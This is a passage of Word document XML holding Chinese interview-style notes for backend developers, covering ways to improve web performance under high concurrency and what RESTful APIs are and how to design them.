      <w:bookmarkStart w:id="372" w:name="7977-1535453601277"/>
      <w:bookmarkEnd w:id="371"/>
      <w:bookmarkEnd w:id="372"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>011</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如何提升性能（高并发）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D08E0F7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="373" w:name="2779-1535453601502"/>
      <w:bookmarkEnd w:id="373"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对一个后端开发程序员来说，提升性能指标主要有两个一个是并发数，另一个是响应时间网站性能的优化一般包括 web 前端性能优化，应用服务器性能优化，存储服务器优化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AB2A04" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="374" w:name="6375-1535453802756"/>
      <w:bookmarkEnd w:id="374"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对前端的优化主要有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79779D76" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="375" w:name="2618-1535453802756"/>
      <w:bookmarkEnd w:id="375"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）减少 http 请求，减少数据库的访问量，比如使用雪碧图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE0B90A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="376" w:name="8153-1535453802756"/>
      <w:bookmarkEnd w:id="376"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）使用浏览器缓存，将一些常用的 css，js，logo 图标，这些静态资源缓存到本地浏览器，通过设置 http 头中的 cache-control 和 expires 的属性，可设定浏览器缓存，缓存时间可以自定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5427BA87" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="377" w:name="8117-1535453802756"/>
      <w:bookmarkEnd w:id="377"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）对 html，css，javascript 文件进行压缩，减少网络的通信量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132BBDAA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="378" w:name="9582-1535453866999"/>
      <w:bookmarkStart w:id="379" w:name="3447-1535453863479"/>
      <w:bookmarkEnd w:id="378"/>
      <w:bookmarkEnd w:id="379"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对我个人而言，我做的优化主要是以下三个方面：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1017D676" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="380" w:name="1414-1535453802756"/>
      <w:bookmarkEnd w:id="380"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）合理的使用缓存技术，对一些常用到的动态数据，比如首页做一个缓存，或者某些常用的数据做个缓存，设置一定得过期时间，这样减少了对数据库的压力，提升网站性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8B2D14" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="381" w:name="4642-1535453802756"/>
      <w:bookmarkEnd w:id="381"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）使用 celery 消息队列，将耗时的操作扔到队列里，让 worker 去监听队列里的任务，实现异步操作，比如发邮件，发短信。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4D4BA7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="382" w:name="2540-1535453802756"/>
      <w:bookmarkEnd w:id="382"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）就是代码上的一些优化，补充：nginx 部署项目也是项目优化，可以配置合适的配置参数，提升效率，增加并发量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335C3B62" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="383" w:name="4040-1535453802756"/>
      <w:bookmarkEnd w:id="383"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（4）如果太多考虑安全因素，服务器磁盘用固态硬盘读写，远远大于机械硬盘，这个技术现在没有普及，主要是固态硬盘技术上还不是完全成熟， 相信以后会大量普及。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745EDFC9" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="384" w:name="7018-1535453802756"/>
      <w:bookmarkEnd w:id="384"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（5）另外还可以搭建服务器集群，将并发访问请求，分散到多台服务器上处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76BC2345" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="385" w:name="1517-1535453802756"/>
      <w:bookmarkEnd w:id="385"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（6）最后就是运维工作人员的一些性能优化技术了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA1F4A5" w14:textId="710AF9D1"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86" w:name="3377-1535453909994"/>
      <w:bookmarkStart w:id="387" w:name="8098-1535453910491"/>
      <w:bookmarkEnd w:id="386"/>
      <w:bookmarkEnd w:id="387"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>012</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什么是</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> restful api</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，谈谈你的理解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22332B0B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="388" w:name="7167-1535453910536"/>
      <w:bookmarkEnd w:id="388"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>REST:Representational State Transfer 的缩写，翻译：“具象状态传输”。一般解释为“表现层状态转换”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20071B51" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="389" w:name="2770-1535453945517"/>
      <w:bookmarkEnd w:id="389"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>REST 是设计风格而不是标准。是指客户端和服务器的交互形式。我们需要关注的重点是如何设计</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAFAF7E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="390" w:name="7154-1535453945517"/>
      <w:bookmarkEnd w:id="390"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>REST 风格的网络接口。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEC500A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="391" w:name="8290-1535453945517"/>
      <w:bookmarkEnd w:id="391"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>REST 的特点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC74C40" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="392" w:name="9774-1535453945517"/>
      <w:bookmarkEnd w:id="392"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）具象的。一般指表现层，要表现的对象就是资源。比如，客户端访问服务器，获取的数据就是资源。比如文字、图片、音视频等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C50B11" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="393" w:name="1562-1535453945517"/>
      <w:bookmarkEnd w:id="393"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>（2）表现：资源的表现形式。txt 格式、html 格式、json 格式、jpg 格式等。浏览器通过 URL 确定资源的位置，但是需要在 HTTP 请求头中，用 Accept 和 Content-Type 字段指定，这两个字段是对资源表现的描述。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F466085" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="394" w:name="3698-1535453945517"/>
      <w:bookmarkEnd w:id="394"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）状态转换：客户端和服务器交互的过程。在这个过程中，一定会有数据和状态的转化，这种转化叫做状态转换。其中，GET 表示获取资源，POST 表示新建资源，PUT 表示更新资源，DELETE 表示删除资源。HTTP 协议中最常用的就是这四种操作方式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F1A3E3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="395" w:name="1046-1535453945517"/>
      <w:bookmarkEnd w:id="395"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>RESTful 架构：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1628FF94" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="396" w:name="3893-1535453954810"/>
      <w:bookmarkEnd w:id="396"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）每个 URL 代表一种资源；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE18883" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="397" w:name="7344-1535453955699"/>
      <w:bookmarkEnd w:id="397"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）客户端和服务器之间，传递这种资源的某种表现层；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103EE8D4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="398" w:name="3869-1535453955699"/>
      <w:bookmarkEnd w:id="398"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）客户端通过四个 http 动词，对服务器资源进行操作，实现表现层状态转换。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5876BB52" w14:textId="527D8EB0"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399" w:name="4433-1535453910584"/>
      <w:bookmarkStart w:id="400" w:name="9684-1535454009815"/>
      <w:bookmarkEnd w:id="399"/>
      <w:bookmarkEnd w:id="400"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>013</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如何设计符合</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> RESTful </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>风格的</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> API</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFD1C5E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="401" w:name="2987-1535453910639"/>
      <w:bookmarkEnd w:id="401"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一、域名：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52362B59" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="402" w:name="3640-1535454054846"/>
      <w:bookmarkEnd w:id="402"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>将 api 部署在专用域名下： </w:t>
      </w:r>
      <w:hyperlink r:id="rId209" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://api.example.com </w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>或者将 api 放在主域名下：</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="403" w:name="6040-1535454054846"/>
    <w:bookmarkEnd w:id="403"/>
    <w:p w14:paraId="0329D013" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "http://www.example.com/api/" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>http://www.example.com/api/</w:t>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="76201B1A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="404" w:name="5140-1535454088810"/>
      <w:bookmarkEnd w:id="404"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>二、版本：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48BCA91C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="405" w:name="9155-1535454054846"/>
      <w:bookmarkEnd w:id="405"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>将 API 的版本号放在 url 中。</w:t>
      </w:r>
      <w:hyperlink r:id="rId210" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/app/1.0/info</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId211" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/app/1.2/info</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="08B080E6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="406" w:name="7170-1535454054846"/>
      <w:bookmarkEnd w:id="406"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>三、路径：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764DB657" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="407" w:name="7941-1535454054846"/>
      <w:bookmarkEnd w:id="407"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
